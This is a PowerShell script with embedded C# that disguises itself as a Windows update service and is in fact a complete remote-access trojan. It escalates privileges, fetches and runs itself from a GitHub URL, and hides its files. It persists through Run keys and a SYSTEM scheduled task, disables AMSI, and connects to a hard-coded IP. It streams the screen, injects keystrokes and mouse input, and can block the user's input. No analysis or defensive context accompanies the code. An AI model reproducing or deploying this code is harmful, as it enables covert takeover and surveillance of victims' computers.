<#
.SYNOPSIS
Windows Critical System Component
#>

$serverIP = "198.1.195.204"
$serverPort = 4000
$installName = "WinUpdateSvc"
$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"

# ===== VERIFICAR ADMIN =====
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
    exit
}

# ===== CAMINHOS E VBS WRAPPER =====
$dir = "$env:ProgramData\Microsoft\Windows\Caches"
$scriptPath = "$dir\$installName.ps1"
$vbsPath = "$dir\$installName.vbs"

New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}

# Cria o VBS que roda o PowerShell invisível
$vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '""", 0, False'
Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue

attrib +h +s +r $scriptPath 2>$null
attrib +h +s +r $vbsPath 2>$null

# ===== PERSISTÊNCIA =====
$cmd = "wscript.exe //B //Nologo `"$vbsPath`""
try {
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
} catch {}

try {
    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
    $trigger1 = New-ScheduledTaskTrigger -AtStartup
    $trigger2 = New-ScheduledTaskTrigger -AtLogOn
    $trigger3 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365)
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
    Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2,$trigger3 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
} catch {}

# ===== FECHA O TERMINAL E RODA EM BACKGROUND =====
if (-not $env:WinUpdateHidden) {
    $env:WinUpdateHidden = "1"
    Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
    exit # Isso fecha a janela do PowerShell na hora
}

# ===== AMSI BYPASS =====
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }

if (-not ("R9KAgent" -as [type])) {
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
    using System;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Net.Sockets;
    using System.Windows.Forms;
    using Microsoft.Win32;
    using System.Diagnostics;

    public class R9KAgent {
        [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
        [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);

        static string IP;
        static int PORT;
        static TcpClient client;
        static NetworkStream stream;
        static StreamReader reader;
        static StreamWriter writer;
        static bool streaming = false;
        static object writeLock = new object();

        static bool isLocked = false;
        static int targetX = 0, targetY = 0;
        static bool hasNewPos = false;

        public static void Start(string ip, int port) {
            IP = ip; PORT = port;
            
            Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();

            while (true) {
                try {
                    client = new TcpClient();
                    client.Connect(IP, PORT);
                    client.NoDelay = true;
                    stream = client.GetStream();
                    reader = new StreamReader(stream, new UTF8Encoding(false));
                    writer = new StreamWriter(stream, new UTF8Encoding(false));
                    writer.AutoFlush = true;

                    Send("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");

                    Thread tRead = new Thread(ReadLoop); tRead.IsBackground = true; tRead.Start();
                    Thread tStream = new Thread(StreamLoop); tStream.IsBackground = true; tStream.Start();
                    Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();

                    while (client.Connected) Thread.Sleep(1000);
                } catch { Thread.Sleep(3000); }
            }
        }

        static void WatchdogLoop() {
            string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
            string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
            
            while (true) {
                try {
                    if (!File.Exists(scriptPath)) {
                        string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                        using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); }
                        File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                    }
                    if (!File.Exists(vbsPath)) {
                        string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\"\", 0, False";
                        File.WriteAllText(vbsPath, vbs);
                        File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                    }

                    string cmd = "wscript.exe //B //Nologo \"" + vbsPath + "\"";
                    using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
                    }
                    using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
                    }
                } catch {}
                Thread.Sleep(5000);
            }
        }

        static void Send(string msg) {
            try { lock (writeLock) { writer.WriteLine(msg); } } catch {}
        }

        static void ReadLoop() {
            try {
                while (client.Connected) {
                    if (stream.DataAvailable) {
                        string cmd = reader.ReadLine();
                        if (cmd != null) ProcessCommand(cmd.Trim());
                    } else { Thread.Sleep(5); }
                }
            } catch {}
        }

        static void InputLoop() {
            while (true) {
                try {
                    if (isLocked) {
                        if (Cursor.Position.X != targetX || Cursor.Position.Y != targetY) {
                            Cursor.Position = new Point(targetX, targetY);
                        }
                    } else {
                        if (hasNewPos) {
                            Cursor.Position = new Point(targetX, targetY);
                            hasNewPos = false;
                        }
                    }
                } catch {}
                Thread.Sleep(5);
            }
        }

        static void StreamLoop() {
            while (true) {
                try {
                    if (streaming && client.Connected) {
                        string b64 = CaptureScreen(1280, 40);
                        if (b64 != null) Send("SCREEN:" + b64);
                        Thread.Sleep(30); 
                    } else { Thread.Sleep(50); }
                } catch { Thread.Sleep(1000); }
            }
        }

        static void ProcessCommand(string cmd) {
            try {
                if (cmd == "stream_start") { streaming = true; return; }
                if (cmd == "stream_stop") { streaming = false; Send("STREAM_STOPPED"); return; }
                
                if (cmd == "uninstall") { 
                    BlockInput(false); 
                    try {
                        using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
                        using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
                        Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService /f").WaitForExit();
                        string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
                        string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
                        if (File.Exists(scriptPath)) { File.SetAttributes(scriptPath, FileAttributes.Normal); File.Delete(scriptPath); }
                        if (File.Exists(vbsPath)) { File.SetAttributes(vbsPath, FileAttributes.Normal); File.Delete(vbsPath); }
                    } catch {}
                    Environment.Exit(0); 
                }
                
                if (cmd == "lock_mouse") {
                    targetX = Cursor.Position.X; targetY = Cursor.Position.Y;
                    isLocked = true; BlockInput(true); Send("MOUSE_LOCKED"); return;
                }
                if (cmd == "unlock_mouse") { 
                    isLocked = false; BlockInput(false); Send("MOUSE_UNLOCKED"); return; 
                }

                if (cmd == "screenshot") { Send("SCREEN:" + CaptureScreen(1920, 85)); return; }
                if (cmd == "ping") { Send("PONG"); return; }

                if (cmd.StartsWith("move ")) {
                    string[] p = cmd.Split(' ');
                    int nx = int.Parse(p[1]); int ny = int.Parse(p[2]);
                    targetX = (int)((nx / 65535.0) * Screen.PrimaryScreen.Bounds.Width);
                    targetY = (int)((ny / 65535.0) * Screen.PrimaryScreen.Bounds.Height);
                    hasNewPos = true; 
                }
                else if (cmd == "md 1") mouse_event(0x0002, 0, 0, 0, 0);
                else if (cmd == "mu 1") mouse_event(0x0004, 0, 0, 0, 0);
                else if (cmd == "md 2") mouse_event(0x0008, 0, 0, 0, 0);
                else if (cmd == "mu 2") mouse_event(0x0010, 0, 0, 0, 0);
                else if (cmd == "md 3") mouse_event(0x0020, 0, 0, 0, 0);
                else if (cmd == "mu 3") mouse_event(0x0040, 0, 0, 0, 0);
                else if (cmd.StartsWith("mw ")) mouse_event(0x0800, 0, 0, (uint)int.Parse(cmd.Substring(3)), 0);
                else if (cmd.StartsWith("kd ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 0, UIntPtr.Zero);
                else if (cmd.StartsWith("ku ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 2, UIntPtr.Zero);
            } catch {}
        }

        static string CaptureScreen(int maxW, long quality) {
            try {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height)) {
                    using (Graphics g = Graphics.FromImage(bmp)) { g.CopyFromScreen(0, 0, 0, 0, bmp.Size); }
                    Bitmap finalBmp = bmp;
                    if (maxW > 0 && bmp.Width > maxW) {
                        int newW = maxW, newH = (int)(bmp.Height * ((float)maxW / bmp.Width));
                        finalBmp = new Bitmap(newW, newH);
                        using (Graphics g2 = Graphics.FromImage(finalBmp)) {
                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                            g2.DrawImage(bmp, 0, 0, newW, newH);
                        }
                    }
                    using (MemoryStream ms = new MemoryStream()) {
                        EncoderParameters ep = new EncoderParameters(1);
                        ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                        ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
                        ImageCodecInfo codec = null;
                        foreach (var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { codec = c; break; } }
                        finalBmp.Save(ms, codec, ep);
                        if (finalBmp != bmp) finalBmp.Dispose();
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            } catch { return null; }
        }
    }
"@
}

# Inicia o Agente
[R9KAgent]::Start($serverIP, $serverPort)
